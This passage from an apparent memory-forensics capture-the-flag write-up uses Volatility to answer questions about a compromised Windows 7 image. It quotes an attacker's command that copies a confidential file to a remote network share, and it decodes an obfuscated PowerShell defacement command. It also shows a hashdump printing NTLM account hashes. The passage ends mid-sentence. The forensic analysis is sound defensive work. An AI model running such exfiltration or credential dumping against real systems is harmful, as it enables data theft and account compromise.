@@ -120,3 +120,96 @@ Cmd #2 at 0x9d1a0: powershell.exe -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2
 ```
 
 <p>The right answer is <custom-code>type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt</custom-code>.</p>
+
+### Following the above command, now tell us if the file was exfiltrated successfully?
+
+<p>The output of the above command will also tell us if the command was successful or not according to stdout.</p>
+
+```bash
+[...snip]
+PS C:\Users\user> type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171
+\pulice\pass.txt
+The network path was not found.
+[...snip]
+```
+
+<p>We can see that a network path was not found. Thus, the answer is <custom-code>NO</custom-code>.</p>
+
+### The attacker tried to create a readme file. What was the full path of the file?
+
+The output of the same command gives us the answer to this question:
+
+```bash
+[...snip]
+Cmd #3 at 0x1be6e0: powershell -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
+[...snip]
+```
+
+<p>We can see that an obfuscated command was run. As it is a base64-encoded text, we can easily decode it:</p>
+
+```bash
+echo "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi" | base64 -d
+echo "hacked by mafia" > "C:\Users\Public\Office\readme.txt"
+```
+
+<p>The right answer is <custom-code>C:\Users\Public\Office\readme.txt</custom-code>.</p>
+
+### What was the Host Name of the machine?
+
+<p>First, we will dump the hives:</p>
+
+```bash
+./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone -f ../recollection.bin --profile=Win7SP1x64_23418 hivelist
+Volatility Foundation Volatility Framework 2.6
+Virtual            Physical           Name
+------------------ ------------------ ----
+0xfffff8a004266010 0x000000009a90f010 \Device\HarddiskVolume1\Boot\BCD
+0xfffff8a004a41010 0x000000009df13010 \SystemRoot\System32\Config\DEFAULT
+0xfffff8a004a57010 0x000000009ddb9010 \SystemRoot\System32\Config\SAM
+0xfffff8a00000d190 0x00000000a9882190 [no name]
+0xfffff8a000024010 0x00000000a96fa010 \REGISTRY\MACHINE\SYSTEM
+0xfffff8a00004f010 0x00000000a9725010 \REGISTRY\MACHINE\HARDWARE
+0xfffff8a0006d4010 0x0000000081300010 \SystemRoot\System32\Config\SECURITY
+0xfffff8a000733010 0x00000000a1d49010 \SystemRoot\System32\Config\SOFTWARE
+0xfffff8a000ca4010 0x000000009f5fb010 \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT
+0xfffff8a000d35010 0x00000000976ff010 \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT
+0xfffff8a00125b010 0x0000000083a0c010 \??\C:\Users\user\ntuser.dat
+0xfffff8a0012e3010 0x000000007cb5d010 \??\C:\Users\user\AppData\Local\Microsoft\Windows\UsrClass.dat
+0xfffff8a00257e010 0x0000000106fd2010 \??\C:\System Volume Information\Syscache.hve
+```
+
+<p>We are interesting in <custom-code>0xfffff8a000024010 0x00000000a96fa010 \REGISTRY\MACHINE\SYSTEM</custom-code>. Once we have the offset of the virtual address, we can run the following command to retrieve the hostname:</p>
+
+```bash
+./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone -f ../recollection.bin --profile=Win7SP1x64_23418 printkey -o 0xfffff8a000024010 -K 'ControlSet001\Control\ComputerName\ComputerName'
+Volatility Foundation Volatility Framework 2.6
+Legend: (S) = Stable   (V) = Volatile
+
+----------------------------
+Registry: \REGISTRY\MACHINE\SYSTEM
+Key name: ComputerName (S)
+Last updated: 2022-12-10 23:48:28 UTC+0000
+
+Subkeys:
+
+Values:
+REG_SZ                        : (S) mnmsrvc
+REG_SZ        ComputerName    : (S) USER-PC
+```
+
+<p>The right answer is <custom-code>USER-PC</custom-code>.</p>
+
+### How many user accounts were in the machine?
+
+<p>We can run a hashdump command to retrieve hashes of all the users in the machine.</p>
+
+```bash
+./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone -f ../recollection.bin --profile=Win7SP1x64_23418 hashdump
+Volatility Foundation Volatility Framework 2.6
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:10eca58175d4228ece151e287086e824:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+user:1001:aad3b435b51404eeaad3b435b51404ee:5915a7959c04d8560468296edaefbc9b:::
+HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:cb6003ecf6b98b5f7fbbb03df798ac76:::
+```
+
+<p>Since the question asks about user accounts, I will not be considering the
